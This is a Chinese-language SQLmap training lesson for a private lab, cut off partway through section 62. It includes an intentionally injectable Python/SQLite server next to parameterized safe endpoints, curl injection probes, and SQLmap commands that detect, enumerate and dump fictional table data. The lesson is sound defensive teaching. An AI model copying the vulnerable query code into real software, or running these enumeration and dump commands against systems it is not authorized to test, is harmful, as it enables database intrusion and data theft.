# 第十一课：SQLmap 完整学习指南

> **实验环境：你自己的 CyberLab**
>
> 本课程只用于你自己创建、拥有并控制的 Web 应用和数据库。  
> 不要对学校、公司、公共网站、政府系统、真实账号或任何未经明确授权的目标运行 SQLmap。

---

# 1. 本课目标

完成本课后，你应该能够：

```text
理解 SQL Injection 的根本原因
理解 SQLmap 的用途、能力和限制
区分 Boolean、Error、UNION、Stacked、Time 和 Inline 技术
在 Ubuntu 上创建受控 SQLite 漏洞实验应用
手工比较正常、True 和 False 请求
使用 SQLmap 检测指定 GET 参数
使用 SQLmap 检测指定 POST 参数
从 Burp Suite 或 ZAP 导出的 Raw Request 运行 SQLmap
限制 Level、Risk、Technique、线程、速率和运行时间
识别后端 DBMS
枚举实验数据库中的表和列
仅导出实验表中的有限测试数据
管理 Session、Output、Traffic、HAR 和 JSON Report
使用 Proxy 把 SQLmap 请求发送到 Burp 或 ZAP
比较 Vulnerable Endpoint 与 Parameterized Endpoint
使用 tcpdump、Wireshark、Access Log 和 Wazuh 观察 SQLmap
修复 SQL Injection 并进行 Retest
完成一份 SQL Injection Assessment 报告
```

CyberLab：

```text
Kali-CyberLab      10.10.20.10
Ubuntu-Target      10.10.20.20
Windows-Target     10.10.20.30
Wazuh-SIEM         10.10.20.40
Network            10.10.20.0/24
```

本课主要通信：

```text
SQLmap：Kali 10.10.20.10
实验 Web App：Ubuntu 10.10.20.20:8089
Database：Ubuntu 本地 SQLite 测试数据库
```

---

# 2. 什么是 SQL Injection？

SQL Injection，简称：

```text
SQLi
```

当应用把用户输入直接拼接进 SQL 语句时，输入可能被数据库当成 SQL 语法执行。

不安全示例：

```python
user_id = input_from_request

query = (
    "SELECT id, username, role "
    f"FROM lab_users WHERE id = {user_id}"
)
```

如果正常输入：

```text
1
```

最终 SQL：

```sql
SELECT id, username, role
FROM lab_users
WHERE id = 1;
```

如果输入改变 SQL 逻辑：

```text
1 AND 1=2
```

最终 SQL：

```sql
SELECT id, username, role
FROM lab_users
WHERE id = 1 AND 1=2;
```

数据库会执行应用拼接后的完整 SQL。

---

# 3. SQL Injection 的根本原因

根本问题不是：

```text
用户输入中出现了单引号
```

根本问题是：

```text
应用没有把数据与 SQL 代码分离
```

危险数据流：

```text
HTTP Parameter
→ 字符串拼接
→ SQL Query
→ Database 执行
```

安全数据流：

```text
HTTP Parameter
→ 类型验证
→ Parameterized Query
→ Database 把输入当作数据
```

---

# 4. 什么是 SQLmap？

SQLmap 是开源自动化渗透测试工具。

它可以自动完成：

- SQL Injection 检测
- Injection Technique 判断
- DBMS Fingerprinting
- Database、Table、Column 枚举
- 指定数据读取
- HTTP Request 重放
- GET、POST、Cookie 和 Header 参数测试
- Session 恢复
- Traffic 与结果记录

SQLmap 的强大之处是：

```text
自动构造大量数据库相关测试
比较响应差异
根据 DBMS 选择语法
通过可用技术提取结果
```

---

# 5. SQLmap 不是什么？

SQLmap 不是：

- 任何网站都能成功的万能工具
- 最终风险判断工具
- 自动授权证明工具
- 安全开发的替代品
- WAF 绕过保证
- 数据库备份工具
- 可以随便扫描公网的工具

SQLmap 报告：

```text
Parameter appears injectable
```

仍然需要：

- 保存检测证据
- 人工验证
- 确认目标范围
- 确认数据影响
- 服务器端确认
- 修复后复测

---

# 6. SQLmap 与前面工具的关系

```text
Nmap：发现 Web 端口
curl：手工发送和比较请求
WhatWeb：识别技术
Gobuster/ffuf：发现参数和路径
Nikto：检查 Web Server 配置
Burp Suite：拦截并导出请求
OWASP ZAP：代理、扫描和自动化
SQLmap：自动测试 SQL Injection
tcpdump/Wireshark：网络证据
Wazuh：日志和安全事件
```

推荐流程：

```text
发现参数
→ curl 手工确认动态行为
→ Burp/ZAP 保存原始请求
→ SQLmap 低风险检测
→ 有限枚举实验数据
→ 服务器端确认代码问题
→ 使用参数化查询修复
→ Retest
```

---

# 7. SQLmap 支持的主要 SQLi 技术

SQLmap 的 `--technique` 字母：

| 字母 | 技术 |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

默认组合：

```text
BEUSTQ
```

本课优先使用：

```text
BU
```

原因：

- 适合当前 SQLite 实验
- 不默认使用慢速 Time-based
- 不依赖 Stacked Query
- 请求行为更容易观察

---

# 8. Boolean-based Blind

Boolean-based 通过比较：

```text
True Response
False Response
```

推断数据。

示例概念：

```text
id=1 AND 1=1
id=1 AND 1=2
```

如果两个响应明显不同，可能形成 Boolean Oracle。

它不一定显示数据库错误。

数据可通过大量 True/False 判断逐字符恢复。

---

# 9. Error-based

Error-based 尝试让数据库产生可解析错误。

例如应用把数据库错误直接返回浏览器：

```text
SQLite error
SQL syntax error
Database exception
```

风险：

```text
错误消息可能泄露数据库类型、Query 和结构
```

生产应用应：

- 给用户返回通用错误
- 在服务器端安全记录详细错误
- 不把 SQL Query 返回客户端

---

# 10. UNION Query-based

UNION 技术尝试把额外查询结果合并到原查询输出。

概念：

```sql
SELECT a, b FROM first_table
UNION ALL
SELECT x, y FROM second_table;
```

它通常要求：

- 列数兼容
- 数据类型兼容
- 查询输出能反映在响应中

本课只让 SQLmap在自己的实验数据库中进行自动判断。

---

# 11. Stacked、Time 与 Inline

## Stacked Queries

在原 SQL 后执行第二条语句：

```text
原语句;
第二条语句
```

并非所有 DBMS、驱动或 Web 技术支持。

## Time-based Blind

通过服务器响应时间推断 True/False。

特点：

```text
请求较慢
容易受网络延迟影响
可能产生大量等待
```

本课默认不使用。

## Inline Queries

把子查询放入原 SQL 结构中。

是否可用取决于输入所处位置和 DBMS。

---

# 12. 安全边界

本课只允许：

```text
http://10.10.20.20:8089/user?id=1
http://10.10.20.20:8089/search?name=student
http://10.10.20.20:8089/lookup
以及对应的 safe-* Endpoint
```

本课不使用：

```text
--all
--passwords
--os-shell
--os-cmd
--file-read
--file-write
--file-dest
--sql-shell
--priv-esc
--tamper
--tor
--random-agent
大规模 -m Bulk Scan
Google Dork
DoS 或资源耗尽测试
```

原因：

```text
本课目标是检测、有限验证和修复
不是系统接管或数据窃取
```

---

# 13. 检查和安装 SQLmap

Kali：

```bash
which sqlmap
```

查看版本：

```bash
sqlmap --version
```

查看基础帮助：

```bash
sqlmap -h
```

查看完整帮助：

```bash
sqlmap -hh
```

如果没有安装：

```bash
sudo apt update
sudo apt install sqlmap
```

查看 Kali 软件包：

```bash
apt policy sqlmap
```

---

# 14. 创建实验目录

Kali：

```bash
mkdir -p ~/CyberLab/SQLmap/{requests,results,traffic,captures,notes,reports}
```

Ubuntu：

```bash
mkdir -p ~/CyberLab/SQLmap/{server,logs,backup}
```

检查：

```bash
find ~/CyberLab/SQLmap -maxdepth 2 -type d
```

---

# 15. Ubuntu SQLite 漏洞实验应用

本实验应用提供：

```text
GET 数字型 Vulnerable Endpoint
GET 字符串型 Vulnerable Endpoint
POST Vulnerable Endpoint
对应的 Parameterized Safe Endpoint
SQLite 测试数据库
固定测试数据
Access Log
数据库错误演示
```

数据库只有虚构实验数据。

---

# 16. 创建 SQLmap 实验服务器

Ubuntu：

```bash
nano ~/CyberLab/SQLmap/server/sqlmap_lab.py
```

粘贴：

```python
#!/usr/bin/env python3

import json
import sqlite3
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


HOST = "10.10.20.20"
PORT = 8089
BASE_DIR = Path.home() / "CyberLab" / "SQLmap" / "server"
DB_PATH = BASE_DIR / "cyberlab.db"


def initialize_database() -> None:
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    with sqlite3.connect(DB_PATH) as connection:
        connection.executescript(
            """
            CREATE TABLE IF NOT EXISTS lab_users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                role TEXT NOT NULL,
                note TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS lab_inventory (
                id INTEGER PRIMARY KEY,
                item TEXT NOT NULL,
                quantity INTEGER NOT NULL
            );
            """
        )

        connection.execute("DELETE FROM lab_users")
        connection.execute("DELETE FROM lab_inventory")

        connection.executemany(
            """
            INSERT INTO lab_users (id, username, role, note)
            VALUES (?, ?, ?, ?)
            """,
            [
                (1, "student", "user", "CyberLab training account"),
                (2, "analyst", "auditor", "Read-only lab analyst"),
                (3, "operator", "operator", "Lab service operator"),
                (4, "admin-demo", "admin", "Fictional lab admin"),
            ],
        )

        connection.executemany(
            """
            INSERT INTO lab_inventory (id, item, quantity)
            VALUES (?, ?, ?)
            """,
            [
                (1, "keyboard", 5),
                (2, "mouse", 8),
                (3, "monitor", 2),
            ],
        )


def rows_to_dicts(cursor: sqlite3.Cursor) -> list[dict]:
    column_names = [
        description[0]
        for description in cursor.description or []
    ]

    return [
        dict(zip(column_names, row))
        for row in cursor.fetchall()
    ]


class SQLmapLabHandler(BaseHTTPRequestHandler):
    server_version = "CyberLabSQLmap/1.0"

    def send_json(
        self,
        status: int,
        data: object,
    ) -> None:
        body = json.dumps(
            data,
            indent=2,
            ensure_ascii=False,
        ).encode("utf-8")

        self.send_response(status)
        self.send_header(
            "Content-Type",
            "application/json; charset=utf-8",
        )
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-CyberLab", "SQLmap-Lab")
        self.end_headers()

        if self.command != "HEAD":
            self.wfile.write(body)

    def run_vulnerable_query(self, sql: str) -> None:
        try:
            with sqlite3.connect(DB_PATH) as connection:
                cursor = connection.execute(sql)
                self.send_json(
                    200,
                    {
                        "query_mode": "vulnerable-string-concatenation",
                        "rows": rows_to_dicts(cursor),
                    },
                )
        except sqlite3.Error as error:
            self.send_json(
                500,
                {
                    "query_mode": "vulnerable-string-concatenation",
                    "database_error": str(error),
                    "sql": sql,
                },
            )

    def run_safe_query(
        self,
        sql: str,
        parameters: tuple[object, ...],
    ) -> None:
        try:
            with sqlite3.connect(DB_PATH) as connection:
                cursor = connection.execute(sql, parameters)
                self.send_json(
                    200,
                    {
                        "query_mode": "parameterized-query",
                        "rows": rows_to_dicts(cursor),
                    },
                )
        except sqlite3.Error:
            self.send_json(
                500,
                {
                    "query_mode": "parameterized-query",
                    "error": "Database operation failed",
                },
            )

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query, keep_blank_values=True)

        if path == "/":
            self.send_json(
                200,
                {
                    "message": "CyberLab SQLmap training server",
                    "vulnerable_endpoints": [
                        "/user?id=1",
                        "/search?name=student",
                        "POST /lookup with id=1",
                    ],
                    "safe_endpoints": [
                        "/safe-user?id=1",
                        "/safe-search?name=student",
                        "POST /safe-lookup with id=1",
                    ],
                },
            )
            return

        if path == "/health":
            self.send_json(
                200,
                {"status": "healthy"},
            )
            return

        if path == "/user":
            user_id = query.get("id", ["1"])[0]

            sql = (
                "SELECT id, username, role, note "
                "FROM lab_users "
                f"WHERE id = {user_id}"
            )

            self.run_vulnerable_query(sql)
            return

        if path == "/safe-user":
            raw_user_id = query.get("id", ["1"])[0]

            try:
                user_id = int(raw_user_id)
            except ValueError:
                self.send_json(
                    400,
                    {"error": "id must be an integer"},
                )
                return

            self.run_safe_query(
                """
                SELECT id, username, role, note
                FROM lab_users
                WHERE id = ?
                """,
                (user_id,),
            )
            return

        if path == "/search":
            name = query.get("name", [""])[0]

            sql = (
                "SELECT id, username, role, note "
                "FROM lab_users "
                f"WHERE username LIKE '%{name}%'"
            )

            self.run_vulnerable_query(sql)
            return

        if path == "/safe-search":
            name = query.get("name", [""])[0]

            self.run_safe_query(
                """
                SELECT id, username, role, note
                FROM lab_users
                WHERE username LIKE ?
                """,
                (f"%{name}%",),
            )
            return

        self.send_json(
            404,
            {"error": "resource not found"},
        )

    def do_HEAD(self) -> None:
        self.do_GET()

    def do_POST(self) -> None:
        content_length = int(
            self.headers.get("Content-Length", "0")
        )
        raw_body = self.rfile.read(content_length)
        form = parse_qs(
            raw_body.decode("utf-8", errors="replace"),
            keep_blank_values=True,
        )

        if self.path == "/lookup":
            user_id = form.get("id", ["1"])[0]

            sql = (
                "SELECT id, username, role, note "
                "FROM lab_users "
                f"WHERE id = {user_id}"
            )

            self.run_vulnerable_query(sql)
            return

        if self.path == "/safe-lookup":
            raw_user_id = form.get("id", ["1"])[0]

            try:
                user_id = int(raw_user_id)
            except ValueError:
                self.send_json(
                    400,
                    {"error": "id must be an integer"},
                )
                return

            self.run_safe_query(
                """
                SELECT id, username, role, note
                FROM lab_users
                WHERE id = ?
                """,
                (user_id,),
            )
            return

        self.send_json(
            404,
            {"error": "POST resource not found"},
        )

    def log_message(self, format: str, *args: object) -> None:
        user_agent = self.headers.get("User-Agent", "-")
        x_lab = self.headers.get("X-Lab-Tool", "-")

        print(
            f'{self.client_address[0]} '
            f'[{self.log_date_time_string()}] '
            f'UA="{user_agent}" '
            f'X-Lab-Tool="{x_lab}" '
            f'{format % args}',
            flush=True,
        )


def main() -> None:
    initialize_database()

    server = HTTPServer(
        (HOST, PORT),
        SQLmapLabHandler,
    )

    print(f"SQLmap lab listening on http://{HOST}:{PORT}")
    print(f"SQLite database: {DB_PATH}")

    server.serve_forever()


if __name__ == "__main__":
    main()
```

保存并退出：

```text
Ctrl + O
Enter
Ctrl + X
```

赋予权限：

```bash
chmod +x ~/CyberLab/SQLmap/server/sqlmap_lab.py
```

---

# 17. 备份实验脚本

```bash
cp \
  ~/CyberLab/SQLmap/server/sqlmap_lab.py \
  ~/CyberLab/SQLmap/backup/sqlmap_lab_original.py
```

检查：

```bash
sha256sum \
  ~/CyberLab/SQLmap/server/sqlmap_lab.py \
  ~/CyberLab/SQLmap/backup/sqlmap_lab_original.py
```

两个 Hash 应相同。

---

# 18. 启动服务器并保存 Access Log

Ubuntu：

```bash
python3 ~/CyberLab/SQLmap/server/sqlmap_lab.py \
  2>&1 |
tee ~/CyberLab/SQLmap/logs/access.log
```

预期：

```text
SQLmap lab listening on http://10.10.20.20:8089
SQLite database: /home/.../CyberLab/SQLmap/server/cyberlab.db
```

保持终端运行。

Ubuntu 第二个终端：

```bash
ss -lntp | grep ':8089'
```

---

# 19. 检查 SQLite 测试数据

Ubuntu：

```bash
python3 - <<'PY'
import sqlite3
from pathlib import Path

db = Path.home() / "CyberLab" / "SQLmap" / "server" / "cyberlab.db"

with sqlite3.connect(db) as connection:
    print("Tables:")
    for row in connection.execute(
        "SELECT name FROM sqlite_master "
        "WHERE type='table' ORDER BY name"
    ):
        print("-", row[0])

    print("\nlab_users:")
    for row in connection.execute(
        "SELECT id, username, role, note "
        "FROM lab_users ORDER BY id"
    ):
        print(row)
PY
```

数据库中只应包含虚构的实验数据。

---

# 20. Kali 扫描前验证

```bash
ping -c 3 10.10.20.20
```

```bash
nc -zvn -w 3 10.10.20.20 8089
```

```bash
curl -i \
  http://10.10.20.20:8089/
```

```bash
sudo nmap -n -sV -p 8089 10.10.20.20
```

---

# 21. 正常 GET 请求

```bash
curl -sS \
  'http://10.10.20.20:8089/user?id=1'
```

预期包含：

```text
student
user
CyberLab training account
```

不存在 ID：

```bash
curl -sS \
  'http://10.10.20.20:8089/user?id=999'
```

预期：

```json
"rows": []
```

---

# 22. 手工 Boolean 对比

True：

```bash
curl -sS -G \
  --data-urlencode 'id=1 AND 1=1' \
  http://10.10.20.20:8089/user
```

False：

```bash
curl -sS -G \
  --data-urlencode 'id=1 AND 1=2' \
  http://10.10.20.20:8089/user
```

比较：

```text
True  → 返回 student
False → rows 为空
```

这构成明显的 Boolean Response 差异。

---

# 23. 手工错误测试

只在当前实验目标：

```bash
curl -sS -G \
  --data-urlencode "id=1'" \
  http://10.10.20.20:8089/user
```

可能返回：

```text
500
database_error
sql
```

生产应用不应把详细 SQL 和数据库错误返回客户端。

---

# 24. Safe Endpoint 对比

正常：

```bash
curl -sS \
  'http://10.10.20.20:8089/safe-user?id=1'
```

注入式输入：

```bash
curl -i -G \
  --data-urlencode 'id=1 AND 1=1' \
  http://10.10.20.20:8089/safe-user
```

安全 Endpoint 应返回：

```text
400
id must be an integer
```

输入没有进入 SQL 语法。

---

# 25. 第一次 SQLmap 检测

Kali：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2 \
  --timeout=10 \
  --retries=1
```

参数含义：

| 参数 | 含义 |
|---|---|
| `-u` | 目标 URL |
| `-p id` | 只测试 `id` |
| `--batch` | 使用默认回答，不等待交互 |
| `--level=1` | 最少的基础测试 |
| `--risk=1` | 低风险测试 |
| `--technique=BU` | Boolean 和 UNION |
| `--threads=1` | 单线程 |
| `--delay=0.2` | 请求之间短暂停顿 |
| `--timeout=10` | 请求超时 |
| `--retries=1` | 超时后只少量重试 |

---

# 26. 预期检测结果

实际文字随版本变化，可能包含：

```text
GET parameter 'id' appears to be dynamic
GET parameter 'id' is injectable
back-end DBMS: SQLite
Type: boolean-based blind
Type: UNION query
```

成功标准不是必须同时发现所有技术。

只要可靠确认一个 Injection Technique：

```text
已经证明参数存在 SQL Injection
```

---

# 27. 为什么明确使用 -p？

如果 URL 有多个参数：

```text
?id=1&view=json&page=1
```

SQLmap 可能测试多个参数。

使用：

```bash
-p id
```

可以：

- 缩小范围
- 减少请求
- 降低日志量
- 提高结果可解释性

---

# 28. Level

```text
--level=1 到 --level=5
```

Level 越高：

- Payload 更多
- Boundary 更多
- 请求更多
- 测试位置更多

官方行为中：

```text
GET 和 POST 参数始终测试
Cookie 从较高 Level 开始测试
User-Agent 和 Referer 需要更高 Level
```

本课保持：

```text
--level=1
```

---

# 29. Risk

```text
--risk=1 到 --risk=3
```

本课只使用：

```text
--risk=1
```

高 Risk 可能加入：

- 更重的 Time-based 测试
- OR-based 测试
- 可能改变更多行的条件

生产环境中 Risk 3 可能造成严重副作用。

---

# 30. Technique

本课检测：

```bash
--technique=BU
```

需要观察错误时可单独测试：

```bash
--technique=E
```

不要一开始强制所有技术。

Time-based：

```text
T
```

可能很慢，本课不作为默认测试。

---

# 31. Verbosity

```text
-v 0 到 -v 6
```

常见：

| 级别 | 内容 |
|---:|---|
| 0 | 很少输出 |
| 1 | 默认信息 |
| 2 | Debug |
| 3 | Payload |
| 4 | HTTP Request |
| 5 | HTTP Response Header |
| 6 | HTTP Response Body |

学习 Payload：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B \
  -v 3
```

`-v 6` 输出可能非常大。


---

# 32. 指定 DBMS 提示

SQLmap 会自动识别 DBMS。

检测后，如果它已经确认 SQLite，可以在后续命令中添加：

```bash
--dbms=SQLite
```

例如：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --dbms=SQLite \
  --level=1 \
  --risk=1 \
  --technique=BU
```

不要在没有证据时随意指定错误 DBMS。

错误提示可能：

- 跳过正确 Payload
- 导致检测失败
- 形成错误结论

---

# 33. DBMS Fingerprint

基础识别通常自动完成。

更详细的 Fingerprint：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --fingerprint \
  --level=1 \
  --risk=1 \
  --technique=BU
```

`--fingerprint` 可能产生更多请求。

本课只运行一次。

---

# 34. Database Banner

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --banner \
  --level=1 \
  --risk=1 \
  --technique=BU
```

可能显示 SQLite 版本。

Banner 只代表：

```text
数据库引擎返回的版本线索
```

---

# 35. Current Database

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --current-db \
  --level=1 \
  --risk=1 \
  --technique=BU
```

SQLite 与客户端/服务器型 DBMS 不同。

SQLmap 版本可能显示：

```text
SQLite_masterdb
main
或其他内部名称
```

后续命令使用 SQLmap 实际返回的名称。

---

# 36. 列出数据库

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --dbs \
  --level=1 \
  --risk=1 \
  --technique=BU
```

SQLite 通常是单一数据库文件。

`--dbs` 的表现可能与 MySQL、PostgreSQL 或 SQL Server 不同。

---

# 37. 列出实验表

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --tables \
  --level=1 \
  --risk=1 \
  --technique=BU
```

预期实验表：

```text
lab_users
lab_inventory
```

如果 SQLmap 要求数据库名，使用它前面返回的名称：

```bash
-D SQLite_masterdb
```

示例：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  --tables \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 38. 列出 lab_users 的列

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  --columns \
  --level=1 \
  --risk=1 \
  --technique=BU
```

预期列：

```text
id
username
role
note
```

SQLmap 也可能显示 SQLite 数据类型。

---

# 39. 只选择指定列

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  -C id,username,role \
  --columns \
  --level=1 \
  --risk=1 \
  --technique=BU
```

指定列有助于：

- 减少请求
- 缩小证据范围
- 避免读取不必要数据

---

# 40. 有限导出实验数据

本课只导出虚构的 `lab_users` 测试数据。

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  -C id,username,role \
  --dump \
  --start=1 \
  --stop=4 \
  --level=1 \
  --risk=1 \
  --technique=BU
```

如果数据库名称不同，替换：

```text
SQLite_masterdb
```

---

# 41. 为什么限制 Start 和 Stop？

```text
--start=1
--stop=4
```

用于限制导出的行范围。

真实授权审计中应遵循：

```text
最少必要数据
最少必要行
避免敏感字段
避免完整数据库 Dump
```

本实验只有四条虚构记录。

---

# 42. 使用 WHERE 限定数据

只读取 ID 小于等于 2 的实验记录：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  -C id,username,role \
  --dump \
  --where='id <= 2' \
  --level=1 \
  --risk=1 \
  --technique=BU
```

`--where` 中的条件属于数据库语法。

只对自己的实验数据库使用。

---

# 43. Dump Format

支持的常见格式：

```text
CSV
HTML
SQLITE
JSONL
```

例如 JSONL：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  -C id,username,role \
  --dump \
  --start=1 \
  --stop=4 \
  --dump-format=JSONL \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 44. 不使用 --all

```bash
--all
```

会尝试获取大量数据库信息。

官方文档也不建议无差别使用，因为它可能：

- 产生大量请求
- 读取无关信息
- 增加风险
- 造成大体量结果

本课使用明确的：

```text
--banner
--tables
--columns
--dump
```

并限制范围。

---

# 45. POST Endpoint 手工验证

正常 POST：

```bash
curl -sS \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'id=1' \
  http://10.10.20.20:8089/lookup
```

Boolean True：

```bash
curl -sS \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'id=1 AND 1=1' \
  http://10.10.20.20:8089/lookup
```

Boolean False：

```bash
curl -sS \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'id=1 AND 1=2' \
  http://10.10.20.20:8089/lookup
```

---

# 46. 使用 --data 测试 POST

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/lookup' \
  --data='id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2
```

`--data` 会让 SQLmap 发送 POST Body。

---

# 47. 指定 POST 参数位置

只测试 POST 参数：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/lookup' \
  --data='id=1' \
  --param-filter=POST \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

`--param-filter=POST` 可以避免测试 Cookie 或 Header 等其他位置。

---

# 48. Safe POST Endpoint

手工测试：

```bash
curl -i \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'id=1 AND 1=1' \
  http://10.10.20.20:8089/safe-lookup
```

SQLmap：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/safe-lookup' \
  --data='id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --flush-session
```

预期：

```text
id 参数不可注入
```

---

# 49. 字符串型 GET 参数

正常搜索：

```bash
curl -sS -G \
  --data-urlencode 'name=student' \
  http://10.10.20.20:8089/search
```

SQLmap：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/search?name=student' \
  -p name \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1
```

字符串型参数的 Payload 与数字型不同。

SQLmap 会根据上下文寻找 Prefix 和 Suffix。

---

# 50. Safe 字符串搜索

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/safe-search?name=student' \
  -p name \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --flush-session
```

预期不会确认 SQL Injection。

Safe Endpoint 使用：

```python
WHERE username LIKE ?
```

输入值作为参数传入数据库驱动。

---

# 51. 使用 Forms

当前 JSON 首页没有 HTML Form，因此 `--forms` 不是本实验首选。

一般语法：

```bash
sqlmap \
  -u 'http://AUTHORIZED-TARGET/page' \
  --forms \
  --batch
```

SQLmap 会：

```text
请求页面
解析 HTML Form
引导测试 Form Input
```

本课优先使用：

```text
--data
或
-r Raw Request
```

因为范围更明确。

---

# 52. 创建 Raw HTTP Request

Kali：

```bash
cat > ~/CyberLab/SQLmap/requests/lookup-request.txt <<'EOF'
POST /lookup HTTP/1.1
Host: 10.10.20.20:8089
User-Agent: CyberLab-SQLmap-Request/1.0
Content-Type: application/x-www-form-urlencoded
Connection: close

id=1
EOF
```

注意 Header 和 Body 之间必须有一个空行。

---

# 53. 从 Raw Request 运行

```bash
sqlmap \
  -r ~/CyberLab/SQLmap/requests/lookup-request.txt \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2
```

`-r` 可以保留：

- Method
- Path
- Host
- Header
- Cookie
- Content-Type
- Body

---

# 54. 从 Burp Suite 导出请求

Burp：

```text
Proxy
→ HTTP history
→ 选择 POST /lookup
→ Copy to file
或保存 Raw Request
```

保存为：

```text
~/CyberLab/SQLmap/requests/burp-lookup.txt
```

运行：

```bash
sqlmap \
  -r ~/CyberLab/SQLmap/requests/burp-lookup.txt \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

导出前清理：

- 真实 Cookie
- Authorization
- 无关 Header
- Scope 外 Host

---

# 55. 从 ZAP 导出请求

ZAP History 中选择请求：

```text
Save Raw Request
或
Copy Request
```

保存：

```text
~/CyberLab/SQLmap/requests/zap-lookup.txt
```

运行方式相同：

```bash
sqlmap \
  -r ~/CyberLab/SQLmap/requests/zap-lookup.txt \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 56. 使用星号指定 Injection Point

在 Raw Request 中可以手工添加：

```text
*
```

例如：

```text
id=1*
```

SQLmap 会把星号位置作为测试点。

示例文件：

```bash
cat > ~/CyberLab/SQLmap/requests/star-request.txt <<'EOF'
POST /lookup HTTP/1.1
Host: 10.10.20.20:8089
Content-Type: application/x-www-form-urlencoded
Connection: close

id=1*
EOF
```

运行：

```bash
sqlmap \
  -r ~/CyberLab/SQLmap/requests/star-request.txt \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 57. 自定义 Header

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --headers='X-Lab-Tool: SQLmap
X-Lab-Lesson: 11' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

更简单的 User-Agent：

```bash
-A 'CyberLab-SQLmap/1.0'
```

完整命令：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  -A 'CyberLab-SQLmap/1.0' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 58. 不使用 Random Agent

```bash
--random-agent
```

会随机使用浏览器 User-Agent。

本课不使用，因为：

- 不需要隐藏工具身份
- Access Log 更难识别实验阶段
- 教学目标是可观察性
- 不学习检测规避

使用固定：

```text
CyberLab-SQLmap/1.0
```

更适合实验。

---

# 59. 使用 Burp 或 ZAP Proxy

确保只运行一个 Proxy Listener：

```text
127.0.0.1:8080
```

SQLmap：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --proxy='http://127.0.0.1:8080' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B \
  --threads=1
```

请求会出现在：

```text
Burp HTTP history
或
ZAP History
```

---

# 60. Proxy 链路

```text
SQLmap
→ 127.0.0.1:8080 Proxy
→ Ubuntu 10.10.20.20:8089
```

抓包时：

```text
lo   = SQLmap → Burp/ZAP
eth0 = Burp/ZAP → Ubuntu
```

不要同时启动 Burp 和 ZAP 并绑定同一个 8080 端口。

---

# 61. 保存 Text Traffic

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B \
  -t ~/CyberLab/SQLmap/traffic/sqlmap-http.txt
```

`-t` 会保存 SQLmap 产生的 HTTP Request 和 Response。

该文件可能很大，也可能包含：

- Payload
- Cookie
- Response Body
- 数据库内容

---

# 62. 保存 HAR

```bash
sqlmap \
